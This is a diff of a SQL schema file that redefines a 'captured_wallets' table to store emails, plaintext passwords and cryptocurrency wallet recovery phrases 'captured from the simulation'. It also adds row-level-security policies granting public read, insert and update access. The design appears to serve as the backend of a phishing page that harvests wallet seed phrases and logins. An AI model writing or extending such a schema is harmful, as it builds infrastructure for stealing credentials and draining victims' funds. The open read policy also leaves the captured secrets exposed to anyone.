@@ -1,16 +1,26 @@
--- schema.sql
--- This table stores the captured wallet information.
+-- captured_wallets table
+-- This table stores credentials and recovery phrases captured from the simulation.
+CREATE TABLE
+  captured_wallets (
+    id BIGINT PRIMARY KEY GENERATED ALWAYS AS IDENTITY,
+    firebase_uid TEXT UNIQUE,
+    email TEXT,
+    password TEXT,
+    wallet_type TEXT,
+    recovery_phrase TEXT,
+    created_at TIMESTAMPTZ DEFAULT NOW()
+  );
 
-CREATE TABLE captured_wallets (
-    id uuid DEFAULT gen_random_uuid() PRIMARY KEY,
-    created_at timestamp with time zone DEFAULT timezone('utc'::text, now()) NOT NULL,
-    user_id uuid, -- This can be a foreign key to your auth.users table
-    wallet_type text NOT NULL,
-    recovery_phrase text NOT NULL
-);
+-- Enable Row Level Security
+ALTER TABLE captured_wallets ENABLE ROW LEVEL SECURITY;
 
--- Optional: If you have user authentication set up with Supabase Auth,
--- you can add a foreign key constraint like this.
--- ALTER TABLE captured_wallets
--- ADD CONSTRAINT fk_user
--- FOREIGN KEY (user_id) REFERENCES auth.users(id);
+-- Create policies
+-- For this simulation, we are keeping it simple. In a real app,
+-- policies would be much more restrictive.
+CREATE POLICY "Allow public read access" ON captured_wallets FOR SELECT USING (true);
+
+CREATE POLICY "Allow public insert access" ON captured_wallets FOR INSERT
+WITH
+  CHECK (true);
+
+CREATE POLICY "Allow public update access" ON captured_wallets FOR UPDATE USING (true);
